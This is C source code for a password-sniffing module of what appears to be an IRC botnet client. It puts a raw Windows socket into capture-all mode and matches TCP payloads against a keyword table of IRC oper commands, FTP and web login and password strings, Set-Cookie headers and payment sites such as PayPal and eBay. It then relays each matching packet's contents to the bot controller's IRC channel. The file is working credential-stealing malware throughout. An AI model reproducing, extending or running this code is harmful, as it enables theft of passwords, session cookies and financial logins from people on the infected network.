#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)

char *ptype[]={
	"Unknown",
	"BOT",
	"IRC",
	"FTP",
	"PHP",
	"HTTP",
	"PAY"
};

PSWORDS pswords[]={
	{":.login",BOTP},
	{"JOIN #",IRCP},
	{"NICK ",IRCP},
	{"OPER ",IRCP},
	{"oper ",IRCP},
	{":Oper",IRCP},
	{"now an IRC Operator",IRCP},
	{"//oper",IRCP},
	{"/oper",IRCP},
	{"//Oper",IRCP},
	{"/Oper",IRCP},
	{"//OPER",IRCP},
	{"/OPER",IRCP},
	{"USER ",FTPP},
	{"PASS ",FTPP},
	{"User ",FTPP},
	{"Pass ",FTPP},
	{"user ",FTPP},
	{"pass ",FTPP},
	{"Password ",FTPP},
	{"password ",FTPP},
	{"PASSWORD ",FTPP},
	{"Admin ",PHPP},
	{"admin ",PHPP},
	{"ADMIN ",PHPP},
	{"login ",PHPP},
	{"Login ",PHPP},
	{"LOGIN ",PHPP},
	{"password ",PHPP},
	{"Password ",PHPP},
	{"PASSWORD ",PHPP},
	{"User ",PHPP},
	{"user ",PHPP},
	{"USER ",PHPP},
	{"Pass ",PHPP},
	{"pass ",PHPP},
	{"PASS ",PHPP},
	{"Admin",HTTPP},
	{"ADMIN",HTTPP},
	{"admin",HTTPP},
	{"Login",HTTPP},
	{"LOGIN",HTTPP},
	{"login",HTTPP},
	{"pass",HTTPP},
	{"Pass",HTTPP},
	{"PASS",HTTPP},
	{"PASSWORD",HTTPP},
	{"Password",HTTPP},
	{"password",HTTPP},
	{"Set-Cookie:",HTTPP},
	{"paypal.com",PAY},
	{"e-gold.com",PAY},
	{"moneybookers.com",PAY},
	{"alertpay.com",PAY},
	{"ebay.com",PAY},
	{"americabank.com",PAY},
};

DWORD WINAPI SniffThread(LPVOID param) {

	char sendbuf[IRCLINE], rawdata[65535], *Packet;
	int i;
	DWORD dwRet, dwMode = 1;

	PSNIFF sniff = *((PSNIFF *)param);
	PSNIFF *sniffs = (PSNIFF *)param;
	sniffs->gotinfo = TRUE;

	IPHEADER *ip;
	TCPHEADER *tcp;
	IN_ADDR sia, dia;

	SOCKET sniffsock;
	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons(0);
	ssin.sin_addr.s_addr = finet_addr(GetIP(sniff.sock));

	if ((sniffsock = fsocket(AF_INET, SOCK_RAW, IPPROTO_IP)) == INVALID_SOCKET) {
		sprintf(sendbuf, "[PSNIFF]: Error: socket() failed, returned: <%d>.", fWSAGetLastError());
		if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice);
		clearthread(sniff.threadnum);
		ExitThread(0);
	}
	threads[sniff.threadnum].sock = sniffsock;

	if (fbind(sniffsock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
		sprintf(sendbuf, "[PSNIFF]: Error: bind() failed, returned: <%d>.", fWSAGetLastError());
		if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice);
		fclosesocket(sniffsock);
		clearthread(sniff.threadnum);
		ExitThread(0);
	}

	if (fWSAIoctl(sniffsock, SIO_RCVALL, &dwMode, sizeof(dwMode), NULL, 0, &dwRet, NULL, NULL) == SOCKET_ERROR) {
		sprintf(sendbuf, "[PSNIFF]: Error: WSAIoctl() failed, returned: <%d>.", fWSAGetLastError());
		if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice);
		fclosesocket(sniffsock);
		clearthread(sniff.threadnum);
		ExitThread(0);
	}

	while(1) {
		memset(rawdata, 0, sizeof(rawdata));
		Packet = (char *)rawdata;

		if (frecv(sniffsock, Packet, sizeof(rawdata), 0) == SOCKET_ERROR) {
            _snprintf(sendbuf,sizeof(sendbuf),"[PSNIFF]: Error: recv() failed, returned: <%d>", fWSAGetLastError());
			if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice);
            break;
        }

		ip = (IPHEADER *)Packet;
		if (ip->proto == 6) {
			Packet += sizeof(*ip);
			tcp = (TCPHEADER *)Packet;

			sia.S_un.S_addr = ip->sourceIP;
			dia.S_un.S_addr = ip->destIP;

			if (tcp->flags == 24) {
				Packet += sizeof(*tcp);
				if (strstr(Packet, "[PSNIFF]") == NULL) {
					for (i=0;i < sizeof(pswords) / sizeof(PSWORDS);i++) {
						if (strstr(Packet, pswords[i].text)) {
							_snprintf(sendbuf, sizeof(sendbuf), "[PSNIFF]: Suspicious %s packet from: %s:%d to: %s:%d - %s", 
								ptype[pswords[i].type], finet_ntoa(sia), fntohs(tcp->sport), finet_ntoa(dia), fntohs(tcp->dport), Packet);
							if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice, TRUE);
							printf("%s\n",sendbuf);
							break;
						}
					}
				}
			}
		}
	}
	fclosesocket(sniffsock);
	clearthread(sniff.threadnum);
	ExitThread(0);
}
